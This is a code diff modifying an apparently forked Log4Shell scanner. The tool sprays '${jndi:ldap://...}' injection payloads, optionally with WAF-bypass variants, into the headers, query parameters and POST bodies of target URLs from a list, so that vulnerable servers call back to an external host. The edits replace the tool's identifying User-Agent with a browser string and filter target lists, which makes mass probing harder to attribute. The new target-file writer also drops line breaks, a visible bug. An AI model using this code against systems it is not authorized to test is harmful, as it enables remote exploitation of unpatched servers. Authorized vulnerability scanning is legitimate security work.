@@ -44,8 +44,6 @@ if len(sys.argv) <= 1:
 
 
 default_headers = {
-    #'User-Agent': 'log4j-scan (https://github.com/mazen160/log4j-scan)',
-    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36',
     'Accept': '*/*'  # not being tested to allow passing through checks on Accept header in older web-servers
 }
 post_data_parameters = ["username", "user", "email", "email_address", "password"]
@@ -94,6 +92,7 @@ blacklist = [
     ".png",
     ".js",
     ".jpg",
+    ".gif",
     "apple.com",
     "google.com",
     "bing.com",
@@ -183,11 +182,11 @@ def get_fuzzing_headers(payload):
                 continue
             if "Authorization" in i:
                  fuzzing_headers.update({i: "Token " + payload})
-            else:
+            elif i not in fuzzing_headers:
                 fuzzing_headers.update({i: payload})
                 
     if args.exclude_user_agent_fuzzing:
-        fuzzing_headers["User-Agent"] = default_headers["User-Agent"]
+        fuzzing_headers["User-Agent"] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
 
     fuzzing_headers["Referer"] = f'https://{fuzzing_headers["Referer"]}'
     return fuzzing_headers
@@ -280,20 +279,21 @@ def scan_test_host(url, callback_host, logfile):
     
     cprint(f"[•] Checking Test Host {url}", "yellow")
     identifier = hashlib.md5(url.encode('utf-8')).hexdigest()[:5]
-    payload = '${jndi:ldap://%s/%s}' % (callback_host,  identifier)
+    payload = '${jndi:ldap://%s.%s}' % (identifier, callback_host)
     payloads = [payload]
     
     if args.waf_bypass_payloads:
-        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', identifier))
+        payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', identifier))     
 
     for payload in payloads:
+        headers = get_fuzzing_headers(payload)
         print(f"[•] URL: {url} | PAYLOAD: {payload}", file=logfile)
         print(f"[•] Testing GET", file=logfile)
         try:
             req = requests.request(url=url,
                             method="GET",
                             params={"v": payload},
-                            headers=get_fuzzing_headers(payload),
+                            headers=headers,
                             verify=False,
                             timeout=timeout,
                             allow_redirects=(not args.disable_redirects),
@@ -309,7 +309,7 @@ def scan_test_host(url, callback_host, logfile):
             req = requests.request(url=url,
                             method="POST",
                             params={"v": payload},
-                            headers=get_fuzzing_headers(payload),
+                            headers=headers,
                             data=get_fuzzing_post_data(payload),
                             verify=False,
                             timeout=timeout,
@@ -321,14 +321,14 @@ def scan_test_host(url, callback_host, logfile):
         except Exception as e:
             cprint(f"EXCEPTION: {e}")
 
-def run_scan(url, payload, logfile):
+def run_scan(url, payload, logfile, headers):
     print(f"[•] URL: {url} | PAYLOAD: {payload}", file=logfile)
     if args.request_type.upper() == "GET" or args.run_all_tests:
         try:
             requests.request(url=url,
                             method="GET",
                             params={"v": payload},
-                            headers=get_fuzzing_headers(payload),
+                            headers=headers,
                             verify=False,
                             timeout=timeout,
                             allow_redirects=(not args.disable_redirects),
@@ -342,7 +342,7 @@ def run_scan(url, payload, logfile):
             requests.request(url=url,
                             method="POST",
                             params={"v": payload},
-                            headers=get_fuzzing_headers(payload),
+                            headers=headers,
                             data=get_fuzzing_post_data(payload),
                             verify=False,
                             timeout=timeout,
@@ -356,7 +356,7 @@ def run_scan(url, payload, logfile):
             requests.request(url=url,
                             method="POST",
                             params={"v": payload},
-                            headers=get_fuzzing_headers(payload),
+                            headers=headers,
                             json=get_fuzzing_post_data(payload),
                             verify=False,
                             timeout=timeout,
@@ -367,8 +367,8 @@ def run_scan(url, payload, logfile):
 
 def scan_url(url, callback_host, logfile):
     identifier = hashlib.md5(url.encode('utf-8')).hexdigest()[:5]
-    payload = '${jndi:ldap://%s/%s}' % (callback_host,  identifier)
-    payloads = [payload]
+    payload = '${jndi:ldap://%s.%s}' % (identifier, callback_host)
+    payloads = [payload]    
 
     if args.waf_bypass_payloads:
         payloads.extend(generate_waf_bypass_payloads(f'{callback_host}', identifier))
@@ -381,7 +381,8 @@ def scan_url(url, callback_host, logfile):
     with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
         futures = []
         for payload in payloads:
-            futures.append(executor.submit(run_scan, url, payload, logfile))     
+            headers = get_fuzzing_headers(payload)
+            futures.append(executor.submit(run_scan, url, payload, logfile, headers))     
 
 def blacklist_check(i):
     for rec in blacklist:
@@ -394,13 +395,16 @@ def main():
     if args.url:
         urls.append(args.url)
     if args.usedlist:
-        with open(args.usedlist, "r") as f:
-            for i in f.readlines():
-                i = i.strip()
-                if i == "" or i.startswith("#"):
-                    continue                
-                if blacklist_check(i) and i not in urls:
-                    urls.append(i)
+        with open("new-clean-targets.txt", "w") as nf:
+            with open(args.usedlist, "r") as f:
+                for i in f.readlines():
+                    i = i.strip()
+                    if i == "" or i.startswith("#"):
+                        continue                
+                    if blacklist_check(i) and i not in urls:
+                        urls.append(i)
+                        nf.write(i)
+
 
     dns_callback_host = ""
     if args.custom_dns_callback_host:
